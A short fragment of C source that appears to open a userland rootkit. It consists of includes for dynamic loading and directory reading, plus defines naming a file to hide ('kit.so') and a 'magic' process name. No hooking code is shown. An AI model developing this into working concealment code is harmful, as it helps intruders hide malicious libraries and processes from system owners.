//#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>

#define FILE_TO_HIDE "kit.so"
#define MAGIC_PROC "sleep"
